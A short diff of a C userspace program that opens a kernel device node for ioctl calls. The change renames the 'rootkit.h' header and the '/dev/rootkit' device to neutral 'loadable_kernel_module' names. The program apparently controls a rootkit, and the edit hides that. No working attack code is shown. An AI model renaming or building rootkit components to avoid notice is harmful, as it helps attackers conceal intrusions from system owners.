@@ -4,7 +4,7 @@
 #include <sys/ioctl.h>  // for ioctl()
 #include <stdlib.h>
 #include <string.h>
-#include "rootkit.h"
+#include "loadable_kernel_module.h"
 
 
 int main(int argc, char *argv[]) {
@@ -14,7 +14,7 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    fd = open("/dev/rootkit", O_RDWR);
+    fd = open("/dev/loadable_kernel_module", O_RDWR);
     if (fd == -1) {
         perror("open");
         return 1;
